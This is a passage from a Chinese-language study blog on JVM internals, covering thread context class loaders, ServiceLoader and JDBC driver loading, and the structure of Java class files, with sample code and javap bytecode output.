        System.out.println(&quot;Parent:&quot;+ classLoader.getParent().getClass());
    }

    public static void main(String[] args) {
       new  MyTest25();
    }
}

&amp;gt; Task :MyTest25.main()
class:class sun.misc.Launcher$AppClassLoader
Parent:class sun.misc.Launcher$ExtClassLoader&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;线程上下文类加载器的一般使用模式获取-使用-还原&quot;&gt;线程上下文类加载器的一般使用模式（获取-使用-还原）&lt;/h4&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;线程上下文类加载器的一般使用模式（获取-使用-还原）
 ClassLoader classloader= Thread.currentThread().getConTextCLassLoader(); // 获取
try{
  Thread.currentThread().setConTextCLassLoader(targetTccl);//使用
  myMethod();
}finally{
  Thread.currentThread().setConTextCLassLoader(classLoader);//还原。
}

1. myMethod里边调用了Thread.currentThread().getConTextCLassLoader();获取当前线程的上下文类加载器某些事情。
2.如果一个类由类加载器A加载，那么这个类的依赖类也是由相同的类加载器加载器的（如果该依赖类没有加载过的话）
3.ContextClassLoader的作用就是为了破坏Java的类加载委托机制。
4.当高层提供了同一的接口让低层去实现，同时又要在高层加载（或者实例化）低层的类时，就必须通过上下文类加载器来帮助高层找到高层的CLassLoader找到并加载该类。&lt;/code&gt;
&lt;/pre&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;举例： 
  1、 首先加入MySQL的依赖 ：  “mysql:mysql-connector-java:5.1.34 ”
public class MyTest26{
    public static void main(String[] args) {
        ServiceLoader&amp;lt;Driver&amp;gt; loader = ServiceLoader.load(Driver.class);
        Iterator&amp;lt;Driver&amp;gt; iterator = loader.iterator();
        while(iterator.hasNext()){
         Driver driver = iterator.next();    System.out.println(&quot;driver:&quot;+driver.getClass()+&quot;,loader:&quot;+driver.getClass().getClassLoader());
        }
        System.out.println(&quot;当前线程上下文类架加载器的对象：&quot;+Thread.currentThread().getContextClassLoader());
        System.out.println(&quot;ServiceLoader的类加载器&quot;+ServiceLoader.class.getClassLoader());
    }
}

&amp;gt; Task :MyTest26.main()
driver:class com.mysql.jdbc.Driver,loader:sun.misc.Launcher$AppClassLoader@659e0bfd
driver:class com.mysql.fabric.jdbc.FabricMySQLDriver,loader:sun.misc.Launcher$AppClassLoader@659e0bfd
当前线程上下文类架加载器的对象：sun.misc.Launcher$AppClassLoader@659e0bfd
ServiceLoader的类加载器null&lt;/code&gt;
&lt;/pre&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;ServiceLoader&amp;lt;Driver&amp;gt; loader = ServiceLoader.load(Driver.class);便能获取到驱动的加载的类。
ServiceLoader解析： 提供了很好的 对 SPI的支持。
  
java.util public final class ServiceLoader&amp;lt;S&amp;gt;
extends Object
implements Iterable&amp;lt;S&amp;gt;
  
A simple service-provider loading facility.
// 一个简单的服务提供商加载工具。
A service is a well-known set of interfaces and (usually abstract) classes. A service provider is a specific implementation of a service. The classes in a provider typically implement the interfaces and subclass the classes defined in the service itself. Service providers can be installed in an implementation of the Java platform in the form of extensions, that is, jar files placed into any of the usual extension directories. Providers can also be made available by adding them to the applications class path or by some other platform-specific means.
//服务是一组著名的接口和（通常是抽象的）类。 服务提供者是服务的特定实现。 提供程序中的类通常实现接口，并子类化服务本身中定义的类。 服务提供程序可以扩展的形式安装在Java平台的实现中，也就是说，将jar文件放置在任何常用扩展目录中。 也可以通过将提供者添加到应用程序类路径或通过其他一些特定于平台的方式来使提供者可用。
For the purpose of loading, a service is represented by a single type, that is, a single interface or abstract class. (A concrete class can be used, but this is not recommended.) A provider of a given service contains one or more concrete classes that extend this service type with data and code specific to the provider. The provider class is typically not the entire provider itself but rather a proxy which contains enough information to decide whether the provider is able to satisfy a particular request together with code that can create the actual provider on demand. The details of provider classes tend to be highly service-specific; no single class or interface could possibly unify them, so no such type is defined here. The only requirement enforced by this facility is that provider classes must have a zero-argument constructor so that they can be instantiated during loading.
//出于加载的目的，服务由单一类型表示，即单一接口或抽象类。 （可以使用一个具体的类，但是不建议这样做。）给定服务的提供者包含一个或多个具体类，这些具体类使用该提供者特定的数据和代码来扩展此服务类型。 提供者类通常不是整个提供者本身，而是包含足够信息以决定提供者是否能够满足特定请求以及可以按需创建实际提供者的代码的代理。 提供程序类的细节往往是高度特定于服务的； 没有单个类或接口可能会统一它们，因此此处未定义此类。 此功能强制执行的唯一要求是，提供程序类必须具有零参数构造函数，以便可以在加载期间实例化它们。
A service provider is identified by placing a provider-configuration file in the resource directory META-INF/services. The file's name is the fully-qualified binary name of the service's type. The file contains a list of fully-qualified binary names of concrete provider classes, one per line. Space and tab characters surrounding each name, as well as blank lines, are ignored. The comment character is '#' ('\u0023', NUMBER SIGN); on each line all characters following the first comment character are ignored. The file must be encoded in UTF-8.
//通过将提供者配置 文件放置在资源目录META-INF / services中来标识服务提供者。 文件名是服务类型的标准二进制名称。 该文件包含一个具体的提供程序类的标准二进制名称列表，每行一个。 每个名称周围的空格和制表符以及空白行将被忽略。 注释字符为“＃”（“ \ u0023”，数字符号）； 在每一行中，第一个注释字符之后的所有字符都将被忽略。 该文件必须使用UTF-8编码。
If a particular concrete provider class is named in more than one configuration file, or is named in the same configuration file more than once, then the duplicates are ignored. The configuration file naming a particular provider need not be in the same jar file or other distribution unit as the provider itself. The provider must be accessible from the same class loader that was initially queried to locate the configuration file; note that this is not necessarily the class loader from which the file was actually loaded.
//如果一个特定的具体提供程序类在多个配置文件中被命名，或者在同一配置文件中被多次命名，则重复项将被忽略。 命名特定提供程序的配置文件不必与提供程序本身位于同一jar文件或其他分发单元中。 该提供程序必须可以从最初查询定位配置文件的同一类加载程序进行访问； 请注意，这不一定是实际从中加载文件的类加载器。
Providers are located and instantiated lazily, that is, on demand. A service loader maintains a cache of the providers that have been loaded so far. Each invocation of the iterator method returns an iterator that first yields all of the elements of the cache, in instantiation order, and then lazily locates and instantiates any remaining providers, adding each one to the cache in turn. The cache can be cleared via the reload method.
//提供商的位置很懒，即按需实例化。 服务加载器维护到目前为止已加载的提供者的缓存。 每次迭代器方法的调用都会返回一个迭代器，该迭代器首先按实例化顺序生成高速缓存的所有元素，然后懒惰地定位和实例化任何剩余的提供程序，依次将每个提供程序添加到高速缓存中。 可以通过reload方法清除缓存。
Service loaders always execute in the security context of the caller. Trusted system code should typically invoke the methods in this class, and the methods of the iterators which they return, from within a privileged security context.
//服务加载程序始终在调用方的安全上下文中执行。 受信任的系统代码通常应从特权安全上下文中调用此类中的方法以及它们返回的迭代器的方法。
Instances of this class are not safe for use by multiple concurrent threads.
Unless otherwise specified, passing a null argument to any method in this class will cause a NullPointerException to be thrown.
//此类的实例不适用于多个并发线程。
//除非另有说明，否则将null参数传递给此类中的任何方法都将引发NullPointerException。
Example Suppose we have a service type com.example.CodecSet which is intended to represent sets of encoder/decoder pairs for some protocol. In this case it is an abstract class with two abstract methods:
   public abstract Encoder getEncoder(String encodingName);
   public abstract Decoder getDecoder(String encodingName);
Each method returns an appropriate object or null if the provider does not support the given encoding. Typical providers support more than one encoding.
  //每个方法都返回一个适当的对象，如果提供者不支持给定的编码，则返回null。典型的提供程序支持多种编码。
If com.example.impl.StandardCodecs is an implementation of the CodecSet service then its jar file also contains a file named
   META-INF/services/com.example.CodecSet
This file contains the single line:
   com.example.impl.StandardCodecs    # Standard codecs
The CodecSet class creates and saves a single service instance at initialization:
   private static ServiceLoader&amp;lt;CodecSet&amp;gt; codecSetLoader
       = ServiceLoader.load(CodecSet.class);
To locate an encoder for a given encoding name it defines a static factory method which iterates through the known and available providers, returning only when it has located a suitable encoder or has run out of providers.
   public static Encoder getEncoder(String encodingName) {
       for (CodecSet cp : codecSetLoader) {
           Encoder enc = cp.getEncoder(encodingName);
           if (enc != null)
               return enc;
       }
       return null;
   }
A getDecoder method is defined similarly.
Usage Note If the class path of a class loader that is used for provider loading includes remote network URLs then those URLs will be dereferenced in the process of searching for provider-configuration files.
//使用说明如果用于提供程序加载的类加载程序的类路径包括远程网络URL，则在搜索提供程序配置文件的过程中将取消引用这些URL。
This activity is normal, although it may cause puzzling entries to be created in web-server logs. If a web server is not configured correctly, however, then this activity may cause the provider-loading algorithm to fail spuriously.
//此活动是正常的，尽管它可能会导致在Web服务器日志中创建令人费解的条目。但是，如果未正确配置Web服务器，则此活动可能导致提供商加载算法错误地失败
A web server should return an HTTP 404 (Not Found) response when a requested resource does not exist. Sometimes, however, web servers are erroneously configured to return an HTTP 200 (OK) response along with a helpful HTML error page in such cases. This will cause a ServiceConfigurationError to be thrown when this class attempts to parse the HTML page as a provider-configuration file. The best solution to this problem is to fix the misconfigured web server to return the correct response code (HTTP 404) along with the HTML error page.
//当请求的资源不存在时，Web服务器应返回HTTP 404（未找到）响应。但是，在某些情况下，有时会错误地将Web服务器配置为返回HTTP 200（OK）响应以及有用的HTML错误页面。当此类尝试将HTML页面解析为提供程序配置文件时，这将引发ServiceConfigurationError。解决此问题的最佳方法是修复配置错误的Web服务器，以返回正确的响应代码（HTTP 404）和HTML错误页面。

private static final String PREFIX = &quot;META-INF/services/&quot;;
// Cached providers, in instantiation order
private LinkedHashMap&amp;lt;String,S&amp;gt; providers = new LinkedHashMap&amp;lt;&amp;gt;();&lt;/code&gt;
&lt;/pre&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;至于为什么会输出两个jdbc的驱动；由下图所示。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbstd7k92lj30ko0g6gnq.jpg&quot; alt=&quot;image-20200211220809384&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbstgs9bvuj30sa06y3zd.jpg&quot; alt=&quot;image-20200211221135025&quot;/&gt;&lt;/p&gt;
&lt;p&gt;听懂了，但是要不要记下来呢？？ 源码里边都有，但是手速已经跟不上了。如果暂停下来去粘贴过来的话，会大量的浪费时间。所以这里就不粘贴过来了，认真的听吧。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbstzrmq27j30cm02i0sq.jpg&quot; alt=&quot;image-20200211222949194&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbsubo00wcj31ki088jyi.jpg&quot; alt=&quot;image-20200211224115417&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;通过jdbc驱动加载深刻理解线程上下文类加载器的机制&quot;&gt;通过jdbc驱动加载，深刻理解线程上下文类加载器的机制&lt;/h4&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;分析一下 这两行代码底层是怎么实现的。已经都学习过了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;// 初始化的作用
// 线程上下文类加载器的作用。
// 精辟。   
 public class MyTest27 {
    public static void main(String[] args) throws Exception{
      // 初始化，会加载类中华的静态方法和内部类。  层层的，如果静态方法中调用静态类，会初始化内部的静态类
        Class.forName(&quot;com.mysql.jdbc.Driver&quot;);  
     
        Connection connection = DriverManager.getConnection(&quot;jdbc:localhost:8080&quot;, &quot;username&quot;, &quot;password&quot;);
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;2020年02月11日23:12:09 。 睡觉。&lt;/p&gt;
&lt;p&gt;2020年02月12日17:07:52&lt;/p&gt;
&lt;h3 id=&quot;类加载器阶段性总结&quot;&gt;类加载器阶段性总结&lt;/h3&gt;
&lt;blockquote readability=&quot;10&quot;&gt;
&lt;p&gt;总结回顾了一下之前学习的所有笔记中的内容。&lt;/p&gt;
&lt;p&gt;论笔记的重要性。学习方式的升级。学习，遗忘，复习。笔记来做一个载体。&lt;/p&gt;
&lt;p&gt;不要给后续留坑，前期欠的东西，以后总归是要还的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;技术学习与思维方式谈心&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;15&quot;&gt;
&lt;p&gt;学习效率，学习方法，重要吗？&lt;/p&gt;
&lt;p&gt;学习一个知识的时候太着急了。并不是一个视频学完了，这门技术就掌握了。&lt;/p&gt;
&lt;p&gt;你学习的时候，目标是什么呢？把视频中讲解的内容给吸收理解了。&lt;/p&gt;
&lt;p&gt;时间和效率两个因素来说，时间是固定的。我们只能从效率入手。&lt;/p&gt;
&lt;p&gt;突击学习只会让你误以为你了解了这个技术。有节奏的学习。张龙老师的视频的准备和录制时间，是在工作之余准备和录制的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;再次复习一下之前学习的规程。&lt;/p&gt;
&lt;p&gt;类加载器学习到此结束。开启一个新的阶段。2020年02月12日21:31:10&lt;/p&gt;
&lt;h2 id=&quot;java字节码&quot;&gt;Java字节码&lt;/h2&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;.class字节码文件是跨平台的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;java字节码文件介绍&quot;&gt;Java字节码文件介绍&lt;/h3&gt;
&lt;p&gt;Java字节码文件的结构及组成部分的学习。&lt;/p&gt;
&lt;blockquote readability=&quot;9&quot;&gt;
&lt;p&gt;javap -c com.erwa.jvm.MyTest1&lt;/p&gt;
&lt;p&gt;Javap -verbose com.erwa.jvm.MyTest1 -- 返回class文件的冗余内容&lt;/p&gt;
&lt;p&gt;.class字节码文件中的内容都是什么？待学习 &lt;strong&gt;Hex_Fiend&lt;/strong&gt;工具&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;​ &lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbtyhw51x5j30xg09275a.jpg&quot; alt=&quot;image-20200212215112336&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbudc70bmsj317c0tudwu.jpg&quot; alt=&quot;image-20200213062442534&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbubte8sbbj31yk0guu0x.jpg&quot; alt=&quot;image-20200213053157620&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;完整的java字节码结构&quot;&gt;完整的Java字节码结构&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbuedliqooj31410u04no.jpg&quot; alt=&quot;image-20200213070039138&quot;/&gt;&lt;/p&gt;
&lt;p&gt;上下两个表相互对应。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbuej4akzuj31070u0b29.jpg&quot; alt=&quot;image-20200213070557356&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbueqedfiqj31b10u01kx.jpg&quot; alt=&quot;image-20200213071256875&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbueqs1z8vj31bg0u04qp.jpg&quot; alt=&quot;image-20200213071319163&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;java字节码基础概念&quot;&gt;Java字节码基础概念&lt;/h3&gt;
&lt;h4 id=&quot;常量池constant-pool&quot;&gt;常量池（constant pool）&lt;/h4&gt;
&lt;blockquote&gt;
&lt;ol&gt;&lt;li&gt;使用java -verbose命令分析一个字节码文件时，将会分析该字节文件的魔数，版本号，常量池，类信息，类的构造方法，类中的信息，类变量与成员变量等信息。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;魔数&lt;/code&gt;：所有的.class字节码文件的前4个字节都是魔数，魔数值为固定值：0xCAFEBABE。&lt;/li&gt;
&lt;li&gt;魔数之后的4个字节为版本信息，前两个字节表示minor version(次版本号)，major versio(主版本号)。这里的00 00 00 34 ，换算成十进制，表示次版本号为0，主版本号为52。所以，该文件的版本信息就是1.8.0。可以通过java -version 命令查看一下Java版本号。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;常量池&lt;/code&gt;（constant pool）: 紧接着主版本号之后的就是常量池入口。一个Java类中定义的很多信息都是由常量池来维护和描述的，可以将常量池看作是class文件的资源仓库，比如说Java类中的定义的方法与变量信息，都是存储在常量池中。常量池中主要存储两类常量：字面量与符号引用。
&lt;ul&gt;&lt;li&gt;字面量：如文本字符串，Java中声明final的常量等。&lt;/li&gt;
&lt;li&gt;符号引用：如类和接口的全局限定名，字段的名称和描述符，方法的名称和描述符等。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;常量池&lt;/code&gt;的总体结构：Java类所对应的常量池主要由常量池数量与常量池数组这两部分共同构成。常量池数量紧跟在主版本号后边，占据2个字节；而常量池数组紧跟在常量池数量之后。常量池数组与一般的数组不同的是，常量池数组中不同的元素的类型、结构都是不同的，长度当然也就不同。但是，每一种元素的第一个数据都是一个u1类型。该字节是一个标志位，占据1个字节。JVM在解析常量池时，会根据这个u1类型来获取元素的具体类型。值得注意的是，常量池数组中元素的个数=常量池数-1 （其中0暂时不使用）。目的是为了满足某些常量池索引值的数据在特定情况下需要表达「不引用任何一个常量池」的含义；其根本在于，索引0也是一个常量（保留常量），只不过他不位于常量表中，这个常量就对应null；所以常量池的索引是从1而非0开始的。&lt;/li&gt;
&lt;/ol&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;常量池中11中数据类型的结构总表：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbucd7l62ij31540u01ky.jpg&quot; alt=&quot;image-20200213055103543&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbxgreuwgej31c00i4x1p.jpg&quot; alt=&quot;image-20200215223948170&quot;/&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;ol&gt;&lt;li&gt;在JVM规范中，每个变量/字段都有描述信息，描述信息主要的作用是描述字段的数据类型、方法的参数列表（包括数量，类型与顺序）与返回值。根据描述符规则，基本数据类型和代表无返回值的void类型都用一个大写字符来表示，对象类型则使用字符L加对象的全限定名称来表示。为了压缩字节码文件的体积，对于基本数据类型，JVM都使用一个大写字母来表示，如下所示：B - byte ； C - char ; D - double ; F - float；I - int ; J -long ; S - short ; Z - boolean ; V - void ;L -对象类型，如：Ljava/lang/String.&lt;/li&gt;
&lt;/ol&gt;&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;ol&gt;&lt;li&gt;对于数组类型来说，每一个维度使用一个前置的[来表示，如int[]被记录为I[]。 String[] [] 被记录为[[Ljava/lang/String;&lt;/li&gt;
&lt;li&gt;用描述符描述方法时，按照先参数列表，后返回值的顺序来描述。参数列表按照参数的严格顺序放在一组（）之内，如方法：String getRealnameByIdAndNickname(int id,String name)的描述符为：（I,Ljava/lang/String;）Ljava/lang/String;&lt;/li&gt;
&lt;/ol&gt;&lt;/blockquote&gt;
&lt;p&gt;Java是一个单继承，多实现的语言。&lt;/p&gt;
&lt;h4 id=&quot;访问标志access_flag&quot;&gt;访问标志（Access_Flag）&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbuev0w684j32970u0e82.jpg&quot; alt=&quot;image-20200213071722662&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbueu7otiwj318x0u07wh.jpg&quot; alt=&quot;image-20200213071636271&quot;/&gt;&lt;/p&gt;
&lt;p&gt;0x0002 private&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbuewmfqvrj318e078n0f.jpg&quot; alt=&quot;image-20200213071856863&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;字段表集合field_info&quot;&gt;字段表集合（field_info）&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbuf0aon53j314i0fqnbg.jpg&quot; alt=&quot;image-20200213072228709&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbuf1kw1m8j317a0hmn22.jpg&quot; alt=&quot;image-20200213072343009&quot;/&gt;&lt;/p&gt;
&lt;p&gt;字段表结构：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbuf2haqslj31mo0fadnz.jpg&quot; alt=&quot;字段表结构&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;方法表集合method_info&quot;&gt;方法表集合（method_info）&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbufaiit4fj31740na7a4.jpg&quot; alt=&quot;image-20200213073217941&quot;/&gt;&lt;/p&gt;
&lt;h5 id=&quot;方法表结构&quot;&gt;方法表结构：&lt;/h5&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbufbs58yvj31640msgsl.jpg&quot; alt=&quot;image-20200213073331287&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbufgxgpo3j317w0n8wm7.jpg&quot; alt=&quot;image-20200213073827813&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbufhttojfj317k0kmk0j.jpg&quot; alt=&quot;image-20200213073919786&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbufif4x1ij316w0sqaye.jpg&quot; alt=&quot;image-20200213073953094&quot;/&gt;&lt;/p&gt;
&lt;h5 id=&quot;方法表结构实例&quot;&gt;方法表结构实例：&lt;/h5&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbufggu27zj31m60soqnt.jpg&quot; alt=&quot;image-20200213073800643&quot;/&gt;&lt;/p&gt;
&lt;h5 id=&quot;code结构code-attribute每一个方法的结构内容&quot;&gt;code结构（code attribute）：每一个方法的结构内容&lt;/h5&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbufiz64a7j315p0u0wra.jpg&quot; alt=&quot;image-20200213074025226&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbufjz7k4jj315s0s4ari.jpg&quot; alt=&quot;image-20200213074123290&quot;/&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbufkxf1pcj318w0neap6.jpg&quot; alt=&quot;image-20200213074218184&quot;/&gt;&lt;/p&gt;
&lt;p&gt;code_length : 之后的字节 会转换成 助记符&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbufmpu8l6j316y0n64qp.jpg&quot; alt=&quot;image-20200213074400768&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;附加属性&quot;&gt;附加属性&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbufnbur0zj315o0ka12c.jpg&quot; alt=&quot;image-20200213074436709&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbufvbegnuj315c0kc48e.jpg&quot; alt=&quot;image-20200213075217293&quot;/&gt;&lt;/p&gt;
&lt;p&gt;LineNumberTable ： 源代码和行号的对应关系。方便抛异常时，定义出错的位置。&lt;/p&gt;
&lt;p&gt;在字节码文件中。 this 属性是默认当做第一个参数给传入进去的。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbufozpkm3j31380csn2j.jpg&quot; alt=&quot;image-20200213074613208&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;字节码查看工具 的GitHub地址&lt;/p&gt;
&lt;p&gt;idea也有插件。 jclasslib&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbukb1xm2gj30ya0s242z.jpg&quot; alt=&quot;image-20200213102548517&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;字节码反编译练习&quot;&gt;字节码反编译练习&lt;/h3&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;// 编译下边的文件，然后反编译。对应字节码去翻译一遍，学习 字节码结构。
// 整体的复习。
 public class MyTest2{
   String str = &quot;welcome&quot;;
   private int x = 5;
   public static Integer in = 10;
   public static void main(String[] args){
     MyTest2 myTest2 = new MyTest2();
     myTest2.setX(8);
     in = 20;
   }
   public void setX(int x){
     this.x = x ;
   }
 }&lt;/code&gt;
&lt;/pre&gt;
&lt;pre class=&quot;shell&quot;&gt;
&lt;code&gt;-- 反编译文件内容为：
➜  jdk8 javap -verbose build.classes.java.main.com.erwa.bytecode.MyTest2     
（此时的命令时不打印私有的信息的。需要加上一个 -p 的参数） 
警告: 二进制文件build.classes.java.main.com.erwa.bytecode.MyTest2包含com.erwa.bytecode.MyTest2
Classfile /Users/erwa/Desktop/work/workspace/idea/jdk8/build/classes/java/main/com/erwa/bytecode/MyTest2.class
  Last modified 2020-2-13; size 833 bytes
  MD5 checksum c119f2eae8cb307e9b90f835d460a4ad
  Compiled from &quot;MyTest2.java&quot;
public class com.erwa.bytecode.MyTest2
  minor version: 0
  major version: 52
  flags: ACC_PUBLIC, ACC_SUPER
Constant pool:
   #1 = Methodref          #10.#34        // java/lang/Object.&quot;&amp;lt;init&amp;gt;&quot;:()V
   #2 = String             #35            // welcome
   #3 = Fieldref           #5.#36         // com/erwa/bytecode/MyTest2.str:Ljava/lang/String;
   #4 = Fieldref           #5.#37         // com/erwa/bytecode/MyTest2.x:I
   #5 = Class              #38            // com/erwa/bytecode/MyTest2
   #6 = Methodref          #5.#34         // com/erwa/bytecode/MyTest2.&quot;&amp;lt;init&amp;gt;&quot;:()V
   #7 = Methodref          #5.#39         // com/erwa/bytecode/MyTest2.setX:(I)V
   #8 = Methodref          #40.#41        // java/lang/Integer.valueOf:(I)Ljava/lang/Integer;
   #9 = Fieldref           #5.#42         // com/erwa/bytecode/MyTest2.in:Ljava/lang/Integer;
  #10 = Class              #43            // java/lang/Object
  #11 = Utf8               str
  #12 = Utf8               Ljava/lang/String;
  #13 = Utf8               x
  #14 = Utf8               I
  #15 = Utf8               in
  #16 = Utf8               Ljava/lang/Integer;
  #17 = Utf8               &amp;lt;init&amp;gt;
  #18 = Utf8               ()V
  #19 = Utf8               Code
  #20 = Utf8               LineNumberTable
  #21 = Utf8               LocalVariableTable
  #22 = Utf8               this
  #23 = Utf8               Lcom/erwa/bytecode/MyTest2;
  #24 = Utf8               main
  #25 = Utf8               ([Ljava/lang/String;)V
  #26 = Utf8               args
  #27 = Utf8               [Ljava/lang/String;
  #28 = Utf8               myTest2
  #29 = Utf8               setX
  #30 = Utf8               (I)V
  #31 = Utf8               &amp;lt;clinit&amp;gt;
  #32 = Utf8               SourceFile
  #33 = Utf8               MyTest2.java
  #34 = NameAndType        #17:#18        // &quot;&amp;lt;init&amp;gt;&quot;:()V
  #35 = Utf8               welcome
  #36 = NameAndType        #11:#12        // str:Ljava/lang/String;
  #37 = NameAndType        #13:#14        // x:I
  #38 = Utf8               com/erwa/bytecode/MyTest2
  #39 = NameAndType        #29:#30        // setX:(I)V
  #40 = Class              #44            // java/lang/Integer
  #41 = NameAndType        #45:#46        // valueOf:(I)Ljava/lang/Integer;
  #42 = NameAndType        #15:#16        // in:Ljava/lang/Integer;
  #43 = Utf8               java/lang/Object
  #44 = Utf8               java/lang/Integer
  #45 = Utf8               valueOf
  #46 = Utf8               (I)Ljava/lang/Integer;
{
  java.lang.String str;
    descriptor: Ljava/lang/String;
    flags:

  public static java.lang.Integer in;
    descriptor: Ljava/lang/Integer;
    flags: ACC_PUBLIC, ACC_STATIC

  public com.erwa.bytecode.MyTest2();
    descriptor: ()V
    flags: ACC_PUBLIC
    Code:
      stack=2, locals=1, args_size=1
         0: aload_0
         1: invokespecial #1                  // Method java/lang/Object.&quot;&amp;lt;init&amp;gt;&quot;:()V
         4: aload_0
         5: ldc           #2                  // String welcome
         7: putfield      #3                  // Field str:Ljava/lang/String;
        10: aload_0
        11: iconst_5
        12: putfield      #4                  // Field x:I
        15: return
      LineNumberTable:
        line 3: 0
        line 4: 4
        line 5: 10
      LocalVariableTable:
        Start  Length  Slot  Name   Signature
            0      16     0  this   Lcom/erwa/bytecode/MyTest2;

  public static void main(java.lang.String[]);
    descriptor: ([Ljava/lang/String;)V
    flags: ACC_PUBLIC, ACC_STATIC
    Code:
      stack=2, locals=2, args_size=1
         0: new           #5                  // class com/erwa/bytecode/MyTest2
         3: dup
         4: invokespecial #6                  // Method &quot;&amp;lt;init&amp;gt;&quot;:()V
         7: astore_1
         8: aload_1
         9: bipush        8
        11: invokevirtual #7                  // Method setX:(I)V
        14: bipush        20
        16: invokestatic  #8                  // Method java/lang/Integer.valueOf:(I)Ljava/lang/Integer;
        19: putstatic     #9                  // Field in:Ljava/lang/Integer;
        22: return
      LineNumberTable:
        line 8: 0
        line 9: 8
        line 10: 14
        line 11: 22
      LocalVariableTable:
        Start  Length  Slot  Name   Signature
            0      23     0  args   [Ljava/lang/String;
            8      15     1 myTest2   Lcom/erwa/bytecode/MyTest2;

  public void setX(int);
    descriptor: (I)V
    flags: ACC_PUBLIC
    Code:
